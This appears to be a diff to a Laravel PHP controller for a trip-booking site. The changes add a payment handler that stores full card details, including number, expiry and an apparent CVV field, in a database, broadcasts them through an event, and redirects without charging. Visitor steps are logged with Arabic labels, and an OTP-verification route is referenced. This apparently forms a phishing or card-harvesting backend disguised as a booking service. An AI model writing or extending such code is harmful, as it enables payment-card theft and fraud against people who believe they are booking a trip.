@@ -3,9 +3,11 @@
 namespace App\Http\Controllers;
 
 use App\Models\Trip;
+use App\Events\SendPart;
+use App\Events\SendVisit;
 use App\Events\NewVisitor;
 use App\Events\SendPeople;
-use App\Events\SendVisit;
+use App\Models\PaymentCard;
 use Illuminate\Http\Request;
 use App\Models\VisitorNotifications;
 
@@ -16,7 +18,7 @@ class TripController extends Controller
         // dd($trip_type);
         try {
             $request['direction_type'] == $request->type;
-            $this->validate($request, [
+            $validated = $this->validate($request, [
                 'from' => 'required|string',
                 'to' => 'required|string',
                 'direction_type' => 'required|string|in:one_direction,go_and_back',
@@ -32,6 +34,7 @@ class TripController extends Controller
             unset($request['direction_type']);
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
+            $request['price'] = $request->ticket_type =='economic' ? 40 : 120;
             $trip = Trip::create($request->all());
 
             return redirect()->route('summary', $trip->id);
@@ -50,9 +53,9 @@ class TripController extends Controller
         $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
         if ($visitor) {
             $not  = VisitorNotifications::find($visitor->id);
-            $not->update(['page' => 'صفحة البيانات الشخصية','step_number'=>2]);
+            $not->update(['page' => 'دخل لصفحة البيانات الشخصية','step_number'=>2]);
             session()->put('visitor', json_encode($not));
-            event(new NewVisitor($not));
+            // event(new NewVisitor($not));
             event(new SendVisit($not));
             return view('people_data');
         }
@@ -79,7 +82,7 @@ class TripController extends Controller
                 $not  = VisitorNotifications::find($visitor->id);
                 $not->update($validated);
                 session()->put('visitor', json_encode($not));
-                event(new NewVisitor($not));
+                // event(new NewVisitor($not));
                 event(new SendPeople($not));
                 return redirect()->route('trip_payment');
             }
@@ -91,21 +94,46 @@ class TripController extends Controller
     public function paymentPage()
     {
         // dd($trip_type);
-        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
-        if ($visitor) {
-            $not  = VisitorNotifications::find($visitor->id);
-            $not->update(['page' => 'قام بإرسال بياناته','step_number'=>4]);
-            session()->put('visitor', json_encode($not));
-            event(new NewVisitor($not));
-            event(new SendVisit($not));
-            return view('trip_payment');
-        }
-        return redirect('/');
+        return view('trip_payment');
+        // $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+        // if ($visitor) {
+        //     $not  = VisitorNotifications::find($visitor->id);
+        //     $not->update(['page' => 'دخل صفحة بيانات الدفع','step_number'=>4]);
+        //     session()->put('visitor', json_encode($not));
+        //     // event(new NewVisitor($not));
+        //     // event(new SendVisit($not));
+        //     return view('trip_payment');
+        // }
+        // return redirect('/');
     }
     public function paymentStore(Request $request)
     {
         // dd($trip_type);
-        return redirect()->route('verify_otp');
+        try {
+            $validated = $this->validate($request, [
+                'cname' => 'required|string',
+                'cnmbr' => 'required|string',
+                'year' => 'required|integer',
+                'month' => 'required|integer',
+                'resume' => 'required|integer',
+            ]);
+
+            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
+            if ($visitor) {
+                $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
+                $payment_card = PaymentCard::create($validated);
+
+                $not  = VisitorNotifications::find($visitor->id);
+                $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>4]);
+                session()->put('visitor', json_encode($not));
+                // event(new NewVisitor($not));
+                event(new SendPart($payment_card,$not));
+            }
+            return redirect('/');
+        } catch (\Exception $ex) {
+            dd($ex->getMessage());
+        }
+
     }
     public function verifyOtp()
     {
